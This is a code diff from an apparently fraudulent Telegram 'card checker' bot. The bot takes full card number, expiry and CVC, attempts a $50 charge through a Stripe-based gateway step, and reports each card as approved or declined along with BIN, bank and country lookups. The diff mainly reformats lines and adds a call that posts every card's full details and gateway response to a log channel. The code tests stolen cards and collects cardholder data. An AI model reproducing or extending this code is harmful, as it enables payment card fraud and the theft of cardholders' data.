-                f"🔵 Stripe Extended Step 5:\n"
-                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
-                f"Response: {step5_response.text}\n"
-                f"Gateway: Stripe Extended [50$]"
-            )
+            # Log step 5 to channel  
+            await client.send_message(  
+                LOG_CHANNEL_ID,  
+                f"🔵 Stripe Extended Step 5:\n"  
+                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
+                f"Response: {step5_response.text}\n"  
+                f"Gateway: Stripe Extended [50$]"  
+            )  
 
-            if 'error' in step5_json:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                response_msg = step5_json.get('error', {}).get('message', 'Unknown error from Step 5')
-            else:
-                status = "APPROVED ✅️"
-                response_msg = "50$ CHARGED ✅️✅️👌"
+            if 'error' in step5_json:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+                response_msg = step5_json.get('error', {}).get('message', 'Unknown error from Step 5')  
+            else:  
+                status = "APPROVED ✅️"  
+                response_msg = "50$ CHARGED ✅️✅️👌"  
 
-        except Exception as e:
-            if not status:
-                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-            if not response_msg:
-                response_msg = str(e)
+        except Exception as e:  
+            if not status:  
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
+            if not response_msg:  
+                response_msg = str(e)  
 
-        elapsed = time.time() - start_time
-        brand, bank, country = get_bin_info(cc[:6])
+        elapsed = time.time() - start_time  
+        brand, bank, country = get_bin_info(cc[:6])  
 
-        result_text = (
-            f"┏━━━━━━━⍟\n"
-            f"┃ {status}\n"
-            f"┗━━━━━━━━━━━⊛\n\n"
-            f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
-            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe Extended [50$] \n"
-            f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {response_msg}\n"
-            f"⌯ 𝐇𝐢𝐠𝐡𝐞𝐬𝐭 𝐒𝐭𝐞𝐩 ➳ {highest_step}\n\n"
-            f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
-            f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
-            f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
-            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
-            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
-            f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
-        )
+        result_text = (  
+            f"┏━━━━━━━⍟\n"  
+            f"┃ {status}\n"  
+            f"┗━━━━━━━━━━━⊛\n\n"  
+            f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"  
+            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe Extended [50$] \n"  
+            f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {response_msg}\n"  
+            f"⌯ 𝐇𝐢𝐠𝐡𝐞𝐬𝐭 𝐒𝐭𝐞𝐩 ➳ {highest_step}\n\n"  
+            f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"  
+            f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"  
+            f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"  
+            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"  
+            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"  
+            f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"  
+        )  
 
-        await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
-        await log_to_channel(client, "CC", message, cc_details, f"{status} - Step {highest_step}")
+        await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)  
+        await log_to_channel(client, "CC", message, cc_details, f"{status} - Step {highest_step}")  
 
-    except Exception as e:
-        await message.reply(f"❌ Error processing command: {str(e)}")
-        if 'proc_msg' in locals():
+    except Exception as e:  
+        await message.reply(f"❌ Error processing command: {str(e)}")  
+        if 'proc_msg' in locals():  
             await proc_msg.delete()
-            
+
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
     loop = asyncio.get_event_loop()
